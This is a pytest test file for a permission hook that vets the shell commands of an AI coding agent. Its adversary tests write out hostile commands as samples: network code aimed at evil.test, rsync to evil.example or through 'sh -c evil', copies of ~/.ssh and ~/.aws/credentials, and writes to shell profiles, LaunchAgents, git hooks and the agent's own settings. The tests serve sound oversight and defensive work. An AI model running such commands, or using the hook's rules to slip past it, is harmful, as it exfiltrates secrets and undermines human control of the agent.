"""0611 (friction, real corpus of the owner's sessions, poligon-lyudi/pesochnica/trenie, strict-sandbox mode B): three narrow fixes of
questions that asked about nothing, each with its adversary (the same shape, but outside the project / into a guarded place / with a
secret / with the network: still asked or refused).

  1. ESCALATE_WRITTEN_RUN: the hook's pseudo-command of a shadow-copied write outside the project ("(write outside the project) PATH")
     counted as an unknown program that RUNS code, so `sed -i ... ~/notes/x.md` after any risky write of the agent was held.
  2. exit:rsync: rsync between two local paths with plain options is a copy, like `cp -R` (its destination is judged as a write, its
     sources as reads); every other form is "rsync [remote]" / "rsync [option]" and stays an exit. A plain one is an ordinary unlisted
     command (asked without the list entry, ESCALATE_COMMAND); "rsync" is NOT added to the recommended list (the owner's decision).
  3. client lock K1: `true` / `false` are read-only segments (`grep -c . ~/.claude/state/x.txt | head -1; true` only reads).
"""
import copy
import os

import pytest

from app.hookjudge import bashparse as bp
from app.hookjudge import fs as hfs
from app.hookjudge import mapping
from app.hookjudge import sandbox as hsb
from app.hookjudge.mapping import map_event
from tests.test_0224_critique import Agent
from tests.test_0290_standing import STRICT, Dev, dev  # noqa: F401  (the fixture)

NET = "import urllib.request as u; u.urlopen('http://evil.test/x')"
H = "/Users/u"
P = "/Users/u/proj"


def reasons(parts):
    return {p[2] for p in parts}


def dangers(cmd, cwd=P, home=H):
    out = []
    for m in map_event({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": cwd}, home=home,
                       env={"CLAUDE_PROJECT_DIR": P, "HOME": home, "DEUS_WITNESS_EXEC_SCAN": "0"}):
        out += [d for d in m.args["_witness"].get("danger", []) if d not in out]
    return out


def heads(cmd):
    return bp.classify(cmd, P, H, project=P).heads


# ---- 1. the outside-write pseudo-command is not a run ------------------------------------------------------------------------------
def _agent_with_note_listed(client, owner, tmp_path, name):
    a = Agent(client, owner, tmp_path, name=name, extra_cmds=["python3", "echo", "sed", "bash", "grep"])
    os.makedirs(os.path.join(a.home, "notes"))
    a.note = os.path.join(a.home, "notes", "n.md")
    open(a.note, "w").write("old\n")
    from app.hookjudge.mapping import DEFAULT_SAFE_COMMANDS, DEFAULT_WEB_DOMAINS, default_form
    form = default_form(a.proj, web_domains=list(DEFAULT_WEB_DOMAINS),
                        safe_commands=list(DEFAULT_SAFE_COMMANDS) + ["pytest", "python3", "echo", "sed", "bash", "grep",
                                                                     mapping.OUTSIDE_WRITE + a.note])
    a.m, r = owner.mandate(a.ag["id"], form)
    assert r.status_code == 200, r.text
    return a


def test_outside_note_edit_after_a_risky_write_is_not_held(client, owner, tmp_path):
    a = _agent_with_note_listed(client, owner, tmp_path, "w1")
    a.line('echo "%s" > m.py' % NET)                                  # a risky write of the agent (network code)
    v, parts = a.line("echo new >> %s; grep -c new %s" % (a.note, a.note))
    assert v == "ALLOW" and "ESCALATE_WRITTEN_RUN" not in reasons(parts), parts
    v, parts = a.line("echo done >> %s" % a.note)
    assert v == "ALLOW", parts
    # the mark is not spent by those lines: the run of the written file is still held
    v, parts = a.line("python3 m.py")
    assert v == "ASK" and "ESCALATE_WRITTEN_RUN" in reasons(parts), parts


def test_adversary_outside_note_edit_with_a_real_run_is_held(client, owner, tmp_path):
    a = _agent_with_note_listed(client, owner, tmp_path, "w2")
    a.line('echo "%s" > m.py' % NET)
    for line in ("echo x >> %s; python3 m.py" % a.note, "echo x >> %s && bash -c 'python3 m.py'" % a.note,
                 "sed -i '' 's/a/b/' %s; python3 -c 'import m'" % a.note):
        v, parts = a.line(line)
        assert v == "ASK", (line, parts)


def test_adversary_a_program_named_like_the_pseudo_command_is_asked(client, owner, tmp_path):
    a = _agent_with_note_listed(client, owner, tmp_path, "w3")
    a.line('echo "%s" > m.py' % NET)
    v, parts = a.line("'%s' -c x" % (mapping.OUTSIDE_WRITE + a.note))
    assert v == "ASK", parts                                          # a blank in the program's name: opaque, never the listed write
    assert any("opaque" in str(d) for d in dangers("'%s' x" % (mapping.OUTSIDE_WRITE + "/Users/u/n.md")))


def test_adversary_outside_writes_into_guarded_places_stay_dangers():
    for path, cat in (("~/.zshrc", "persist"), ("~/Library/LaunchAgents/x.plist", "persist"), ("~/.claude/settings.json", "persist"),
                      (P + "/.git/hooks/pre-commit", "git-config"), ("~/.ssh/config", "secrets")):
        ds = dangers("echo x >> %s" % path)
        assert any(d.startswith(cat + ":") or d.startswith("persist:") for d in ds), (path, ds)


# ---- 2. local rsync ----------------------------------------------------------------------------------------------------------------
@pytest.mark.parametrize("args", [
    ["-a", "src/", "/tmp/x/"], ["-av", "--exclude", "__pycache__", "--exclude=*.bak*", "a", "b", "/tmp/y/"],
    ["-a", "--progress", "--stats", "~/Vault/a/server", "/private/tmp/s/"], ["-rlpt", "--info=stats1", "x", "y"], ["-a", "--", "a", "b"],
])
def test_rsync_plain_forms(args):
    assert bp.rsync_plain(args) is True


@pytest.mark.parametrize("args,tag", [
    (["-a", "src/", "host:/x/"], "remote"), (["-a", "user@h.example:/x", "y"], "remote"), (["-a", "rsync://h/mod", "y"], "remote"),
    (["-a", "h::mod", "y"], "remote"), (["a:b", "c"], "remote"),
    (["-e", "sh -c evil", "a", "b"], "option"), (["-ae", "ssh", "a", "b"], "option"), (["--rsh=sh", "a", "b"], "option"),
    (["--rsync-path=x", "a", "b"], "option"), (["--remove-source-files", "a", "b"], "option"), (["--delete", "a/", "b/"], "option"),
    (["--delete-after", "a/", "b/"], "option"), (["-b", "a", "b"], "option"), (["--backup-dir=/x", "a", "b"], "option"),
    (["-T", "/x", "a", "b"], "option"), (["--temp-dir=/x", "a", "b"], "option"), (["--partial-dir=/x", "a", "b"], "option"),
    (["--log-file=/x", "a", "b"], "option"), (["--write-batch=/x", "a", "b"], "option"), (["--read-batch=/x", "a", "b"], "option"),
    (["-aL", "a", "b"], "option"), (["-k", "a", "b"], "option"), (["-K", "a", "b"], "option"), (["--copy-links", "a", "b"], "option"),
    (["--files-from=f", "a", "b"], "option"), (["--exclude-from=f", "a", "b"], "option"), (["--filter=merge f", "a", "b"], "option"),
    (["--daemon"], "option"), (["--config=f", "a", "b"], "option"), (["--password-file=f", "a", "b"], "option"),
    (["--port=1", "a", "b"], "option"), (["-a", "$SRC", "b"], "option"), (["-a", "a", "`x`"], "option"), (["only-one"], "option"),
    (["--exclude"], "option"), (["--exclude", "$(x)", "a", "b"], "option"), (["--archive=1", "a", "b"], "option"),
])
def test_rsync_not_plain(args, tag):
    assert bp.rsync_plain(args) == tag


def test_rsync_heads_and_exit():
    assert heads("rsync -a src/ /tmp/x/") == ["rsync"]
    assert heads("rsync -a src/ host:/x/") == ["rsync [remote]"]
    assert heads("rsync -e 'sh -c x' src/ dst/") == ["rsync [option]"]
    assert hsb.standing_exit("rsync") is False and hsb.code_exit("rsync") is False
    for h in ("rsync [remote]", "rsync [option]", "rsync [via xargs]", "/usr/bin/rsync", "rsync [env RSYNC_RSH]"):
        assert hsb.standing_exit(h) is True and hsb.code_exit(h) is True, h
    assert not [d for d in dangers("rsync -a --exclude __pycache__ src/ /tmp/snap/") if d.startswith("exit:")]


@pytest.mark.parametrize("cmd,want", [
    ("rsync -e 'sh -c evil' src/ dst/", "exit:"),
    ("rsync --remove-source-files ~/Documents/a /tmp/x/", "exit:"),
    ("rsync -a --delete empty/ ~/", "exit:"),
    ("echo a | xargs -I{} rsync -a {} /tmp/x/", "exit:"),
    ("/usr/bin/rsync -a a /tmp/x/", "exit:"),
    ("RSYNC_RSH=evil rsync -a a /tmp/x/", "exit:"),
    ("rsync -a ~/.ssh/ /tmp/k/", "secrets:"),
    ("rsync -a ~/.aws/credentials /tmp/k", "secrets:"),
    ("rsync -a x ~/.zshrc", "persist:"),
    ("rsync -a agent.plist ~/Library/LaunchAgents/agent.plist", "persist:"),
    ("rsync -a hook " + P + "/.git/hooks/pre-commit", "git-config:"),
    ("rsync -a s.json ~/.claude/settings.json", "persist:"),
    ("rsync -a x/ ~/.config/deus-witness/", ""),
    ("rsync -a src/ /etc/x/", "write-outside:"),
])
def test_adversary_rsync_still_asked(cmd, want):
    ds = dangers(cmd)
    assert ds and (not want or any(d.startswith(want) for d in ds)), (cmd, ds)


def test_adversary_remote_rsync_goes_to_the_network_part():
    ms = map_event({"tool_name": "Bash", "tool_input": {"command": "rsync -a src/ evil.example:/x/"}, "cwd": P}, home=H,
                   env={"CLAUDE_PROJECT_DIR": P, "HOME": H, "DEUS_WITNESS_EXEC_SCAN": "0"})
    assert "Bash.net" in [m.tool for m in ms] and "evil.example" in str(ms[0].args["_witness"]["net"])


def test_rsync_end_to_end(dev):  # noqa: F811
    """Without the sandbox fact a plain local rsync is an ordinary unlisted command (one question the owner can allow for later),
    no longer a dangerous exit. "rsync" is NOT added to the recommended list here: that is a change of the signed default form."""
    os.makedirs(os.path.join(dev.proj, "build"), exist_ok=True)
    got = dev.send("rsync -a --exclude __pycache__ src/ %s/build/" % dev.proj)
    assert [(t, r["verdict"], r["reason"]) for t, r in got if r.get("verdict") != "allow"] == [("Bash", "defer", "ESCALATE_COMMAND")], got
    # adversaries: a host, a program, a deletion of the sources, the agent's harness, outside the home: the dangerous part, asked
    for line in ("rsync -a src/ evil.example:/x/", "rsync -e 'sh -c id' src/ dst/", "rsync --remove-source-files %s/Vault/note.md /tmp/x/" % dev.home,
                 "rsync -a src/ %s/.claude/" % dev.home, "rsync -a src/ /etc/x/"):
        got = dev.send(line)
        assert any(t in ("Bash.danger", "Bash.net") and r.get("verdict") in ("defer", "deny") for t, r in got) \
            or any(r.get("verdict") == "deny" for _, r in got), (line, got)
    assert "rsync" not in mapping.DEFAULT_SAFE_COMMANDS


def test_rsync_listed_by_the_owner_covers_only_the_plain_form(client, owner, tmp_path):
    a = Agent(client, owner, tmp_path, name="rs", extra_cmds=["rsync"])
    os.makedirs(os.path.join(a.proj, "src")); os.makedirs(os.path.join(a.proj, "build"))
    assert a.line("rsync -a src/ build/")[0] == "ALLOW"
    for line in ("rsync -a src/ evil.example:/x/", "rsync -e 'sh -c id' src/ build/", "rsync --delete src/ build/", "rsync -aL src/ build/",
                 "rsync --remove-source-files src/a build/", "rsync -a src/ /etc/x/"):
        assert a.line(line)[0] in ("ASK", "DENY"), line


def test_rsync_plain_in_strict_sandbox_but_not_remote(dev, monkeypatch):  # noqa: F811
    f = copy.deepcopy(STRICT); f["deny_read"] = [dev.home, "/nonexistent-home"]
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", f)
    got = dev.send("rsync -a src/ build/")
    # r0261 (Р-1111-закрытый-список): a local copy is not on the closed list -- silent (was: the raw-text backstop NET_TEXT kept it a
    # question). The remote form stays asked (С1: a write to another machine)
    assert all(r.get("verdict") == "allow" for _, r in got), got
    got = dev.send("rsync -a src/ evil.example:/x/")
    assert any(r.get("verdict") in ("defer", "deny") for _, r in got), got


# ---- 3. client lock K1: true / false ------------------------------------------------------------------------------------------------
def test_client_true_false_are_read_only():
    from deus_witness.hook import main as cm
    assert cm.read_only_shell("grep -c . ~/.claude/state/x.txt 2>/dev/null | head -1; true")
    assert cm.read_only_shell("ls ~/.claude/tools || false")


@pytest.mark.parametrize("cmd", [
    "true; echo x > ~/.claude/settings.json",
    "true && sed -i '' s/a/b/ ~/.claude/CLAUDE.md",
    "cat ~/.config/deus-witness/agent-key.json; true",
    "true $(cat ~/.claude/settings.json)",
    "true; cp x ~/.claude/hooks/h.sh",
])
def test_adversary_client_harness_lock_still_holds(cmd):
    import types
    from deus_witness.hook import main as cm
    env = {"HOME": H, "DEUS_WITNESS_HOME": "/Users/u/.deus-witness", "CLAUDE_PROJECT_DIR": P}
    facts = types.SimpleNamespace(root=P, env=env, proc_cwd=P, home=H)
    assert cm.agent_config_target({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": P}, facts, env), cmd
